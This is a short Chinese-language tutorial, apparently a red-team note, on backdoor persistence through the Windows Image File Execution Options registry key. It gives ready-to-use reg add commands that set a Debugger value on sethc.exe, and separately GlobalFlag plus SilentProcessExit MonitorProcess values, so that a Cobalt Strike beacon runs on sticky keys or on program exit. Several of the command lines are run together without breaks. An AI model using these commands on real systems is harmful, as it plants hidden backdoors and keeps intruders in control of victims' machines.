映像劫持  
原理是注册表路径IFEO（image file execution options）的exe程序被修改，然后进行重定向执行后门程序的过程  
修改Debugger值运行某exe程序时候，系统会在注册表image file execution option中寻找是否存在exe的项注册表路径：

*   

```
`计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
```

  
存在则寻找该项中Debugger的字符串值，找到则启动Debugger值对应的程序，并将某exe文件的完整路径传递给Debugger程序所以我们将Debugger对应的程序改为后门即可  
例如sethc.exe在IFEO中新添加一个项，取名sethc.exe新建一个字符串值Debugger，键值修改为后门（我用的CS生成的beacon）存在的路径![](../Images/5fd178cf534ccab1cef35e48ec292a4e.png)关闭注册表，连续五次shitf触发sethc.exe程序系统就会重定向到指定路径，执行beacon.exe成功上线。  
命令行操作(需要权限)：

*   
*   

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /freg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Users\132\Desktop\1233\beacon.exe" /f
```

  

  
修改GlobalFlag值在注册表路径IFEO下的exe程序中查看是否有GlobalFlag值为2![](../Images/c8a82ea1d7c4e2a470a83260705a6c58.png)  
注册表跳转到SilentProcessExit下查找该程序会有两个键值reportingmode和monitorprocess![](../Images/e25b52ec438d10b4d4715242085e2b72.png)

> ReportingMode是进程操作状态1是进程静默退出，会启动监视器进程2检测进程静默退出，将会为受监视的进程创建转储文件3检查到进程静默退出时，会弹出通知

所以将reportingmode改为1  

> MonitorProcess是监视器进程

将MonitorProcess改为后门路径或者改为powershell程序  
  
这样，当程序运行后点击退出时，自动触发后门，cs成功上线命令行操作(需要权限)：

*   
*   
*   
*   

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /freg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v GlobalFlag /t REG_DWORD /d 512 /freg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v ReportingMode /t REG_DWORD /d 1 /freg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\sethc.exe" /v MonitorProcess /t REG_SZ /d "C:\Users\132\Desktop\1233\beacon.exe" /f
```
